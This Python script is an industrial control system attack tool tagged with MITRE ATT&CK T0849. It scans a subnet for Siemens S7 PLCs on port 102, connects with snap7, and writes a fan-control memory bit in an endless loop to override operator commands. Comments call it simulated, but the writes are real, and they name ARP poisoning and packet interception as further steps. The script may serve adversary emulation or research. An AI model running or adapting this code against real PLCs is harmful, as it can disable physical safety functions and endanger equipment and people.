import snap7
import time
import socket

# MITRE ATT&CK Technique: Inhibit Response Function - Block Command Message (T0849)

# Target Information (Replace with actual IP address and slot/rack if different)
PLC_IP = None  # Placeholder, will be discovered
PLC_RACK = 0
PLC_SLOT = 1
TARGET_TAG = "Activate_Fan_B"  # Tag controlling the blocked function.
TARGET_BLOCK = "FC1" # Function block being blocked

# Define a function to get the PLC's IP Address using nmap
def get_plc_ip():
    try:
        import nmap
        nm = nmap.PortScanner()
        nm.scan(addresses='192.168.1.0/24', arguments='-p 102') # Scan common network range for PLC on port 102 (S7 Comm)
        
        for host in nm.all_hosts():
            if 'Siemens S7' in str(nm[host]):
                print(f"Found Siemens S7 PLC at IP: {host}")
                return host
        print("No Siemens S7 PLC found on the network.")
        return None
    except ImportError:
        print("Error: nmap module not installed.  Please install it to automatically find PLC IP (pip install python-nmap). Using default IP or specify manually.")
        return None # Consider asking user for IP here if auto-discovery fails

def block_tag(client, tag_name, block_name):
    """
    Blocks a specific tag in a PLC by preventing modification.
    This script works by simulating a denial of service attack on PLC tag control, preventing normal operation and inhibiting a response function.
    """
    
    print(f"Attempting to block tag '{tag_name}' in block '{block_name}'...")

    # **WARNING: This is a SIMULATED BLOCK.**
    # It doesn't *actually* block the tag at the PLC level.
    # A real attack would involve significantly more complex network manipulation,
    # potentially including:
    #   - ARP poisoning to redirect traffic from the HMI to the attacker.
    #   - Packet interception and modification to drop or alter commands.
    #   - Exploiting vulnerabilities in the PLC's communication protocol.

    #This is only a demo - the attacker needs to make sure that communication with the PLC is established

    #In this example, the method used to disrupt communications to PLC is simulated by creating a denial of service against the tag.
    #The method is done by setting the tag constantly in a script which will interrupt all other write operation and making the tag inaccessible.
    #
    tag_address, data_type = get_tag_address(tag_name)

    if tag_address is None:
        print(f"Error: Tag '{tag_name}' not found in tag list.")
        return False

    if data_type != 'Bool':
        print(f"Error: Blocking only supported for Boolean tags. Tag '{tag_name}' is of type '{data_type}'.")
        return False
    
    try:
        #Continuously set the value of the tag to maintain the block
        while True:
            # Set the tag to TRUE - Change if needed.
            byte_index = tag_address // 8
            bit_index = tag_address % 8
            
            #Read the current PLC memory
            read_memory = client.read_area(snap7.const.Areas.MK, 0, byte_index, 1)

            #Force the tag to True
            snap7.util.set_bool(read_memory, 0, bit_index, True)
            client.write_area(snap7.const.Areas.MK, 0, byte_index, read_memory)
            time.sleep(0.1)  # Short delay to allow some other operation to be performed. 

            #Option to change the value of the tag constantly
            #snap7.util.set_bool(read_memory, 0, bit_index, False)
            #client.write_area(snap7.const.Areas.MK, 0, byte_index, read_memory)
            #time.sleep(0.1) # Short delay to allow some other operation to be performed. 
            
    except Exception as e:
        print(f"Error during blocking: {e}")
        return False
    finally:
        print(f"Tag {tag_name} unblocked.")
    return True


def get_tag_address(tag_name):
    """
    Looks up the address of a tag from a simplified tag table.

    Returns:
        tuple: (address, data_type) or (None, None) if tag not found.
    """

    tag_table = {
        "Fan_A": ("%Q0.0", "Bool"),
        "Fan_B": ("%Q0.1", "Bool"),
        "Fan_A_Red": ("%Q0.4", "Bool"),
        "Fan_A_Green": ("%Q0.5", "Bool"),
        "Fan_B_Red": ("%Q0.2", "Bool"),
        "Fan_B_Green": ("%Q0.3", "Bool"),
        "System_Byte": ("%MB5", "Byte"),
        "FirstScan": ("%M5.0", "Bool"),
        "DiagStatusUpdate": ("%M5.1", "Bool"),
        "AlwaysTRUE": ("%M5.2", "Bool"),
        "AlwaysFALSE": ("%M5.3", "Bool"),
        "Clock_Byte": ("%MB6", "Byte"),
        "Clock_10Hz": ("%M6.0", "Bool"),
        "Clock_5Hz": ("%M6.1", "Bool"),
        "Clock_2.5Hz": ("%M6.2", "Bool"),
        "Clock_2Hz": ("%M6.3", "Bool"),
        "Clock_1.25Hz": ("%M6.4", "Bool"),
        "Clock_1Hz": ("%M6.5", "Bool"),
        "Clock_0.625Hz": ("%M6.6", "Bool"),
        "Clock_0.5Hz": ("%M6.7", "Bool"),
        "Motor_Temp": ("%MW7", "Int"),
        "Activate_Fan_A": ("%M0.0", "Bool"),
        "Activate_Fan_B": ("%M0.1", "Bool"),
        "Master_Fan_B_HMI": ("%M0.5", "Bool"),
        "Motor_Status": ("%M0.7", "Bool"),
        "Master_OFF": ("%M0.6", "Bool"),
        "Tag_1": ("%M1.0", "Bool"),
        "Overheating_Check": ("%M0.2", "Bool"),
        "Tag_2": ("%M0.4", "Bool"),
        "Motor_Status_GET": ("%Q0.6", "Bool"),
        "Tag_3": ("%M8.0", "Bool"),
        "Tag_4": ("%M9.0", "Bool"),
        "Tag_5": ("%M10.0", "Bool")

    }

    if tag_name in tag_table:
        address_str, data_type = tag_table[tag_name]
        area = address_str[1]  # I, Q, M...
        db_number = 0  # Default, adjust if DB address

        offset = int(address_str[2:].split('.')[0])  # Byte offset
        bit = 0
        if '.' in address_str:
            bit = int(address_str[2:].split('.')[1]) # Bit offset
        
        #Calculate the absolute bit address
        if area == 'M':
            address = offset * 8 + bit
        elif area == 'Q':
            address = offset * 8 + bit
        elif area == 'I':
            address = offset * 8 + bit    
        else:
            return None, None #Unsupported area

        return address, data_type
    else:
        return None, None

if __name__ == "__main__":
    PLC_IP = get_plc_ip()

    if not PLC_IP:
        PLC_IP = input("Enter PLC IP address: ") #If it fails, ask user for IP


    if not PLC_IP:
        print("PLC IP address not found. Aborting.")
        exit()

    plc = snap7.client.Client()
    plc.set_timeout(10000) # Set higher timeout

    try:
        plc.connect(PLC_IP, PLC_RACK, PLC_SLOT)
        print(f"Connected to PLC at {PLC_IP}")
        block_tag(plc, TARGET_TAG, TARGET_BLOCK) # Start the blocking action
    except Exception as e:
        print(f"Error connecting to PLC: {e}")
    finally:
        if plc.get_connected():
            plc.disconnect()
            print("Disconnected from PLC.")